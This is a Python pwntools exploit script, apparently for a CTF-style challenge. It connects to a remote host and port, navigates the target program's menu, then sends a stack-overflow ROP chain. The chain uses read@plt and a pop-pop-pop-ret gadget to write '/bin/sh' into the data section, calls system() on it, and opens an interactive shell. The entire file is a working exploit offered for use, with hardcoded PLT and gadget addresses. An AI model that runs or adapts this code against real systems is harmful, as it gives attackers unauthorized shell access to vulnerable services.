#!/usr/bin/python

from pwn import *
import sys
import os

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'
#context.terminal = ['tmux', 'new', '-s', 'dev']

#data 영역에 string 저
binsh_string = b"/bin/sh\n"
# binsh_string = b"cat flag\n"
binsh_addr = 0x804c048
pppr_addr = 0x8049821

read_plt = 0x8049120
system_plt = 0x8049160

stdin = 0
stdout = 1

def exploit():

    payload = b''
    payload += b'A'*28
    
    
    # 1. save string "/bin/sh" 
    payload += p32(read_plt)
    payload += p32(pppr_addr)
    payload += p32(stdin) # wait in 1-1
    payload += p32(binsh_addr)
    payload += p32(len(binsh_string))

    # 2. call system() 
    payload += p32(system_plt) 
    payload += b'A'*4
    payload += p32(binsh_addr)

    res = r.recvuntil(b"name?")
    print(res)
    r.sendline(b"a")
    res = r.recvuntil(b"menu")
    print(res)
    r.sendline(b"2")
    res = r.recvuntil(b"Code")
    print(res)
    r.sendline(b"pwn!")
    res = r.recvuntil(b"integer")
    print(res)
    #r.sendline(payload)
    r.send(payload)
    r.send(binsh_string) # send string

    r.interactive()

# proceed case by case

if len(sys.argv) == 3: # remote
    r=remote(sys.argv[1], int(sys.argv[2]))
else:
    print("ex) python exploit.py <PROCESS_PATH>")
    print("    python exploit.py <IP_ADDRESS> <PORT>")
    exit(0)


pause()

exploit()
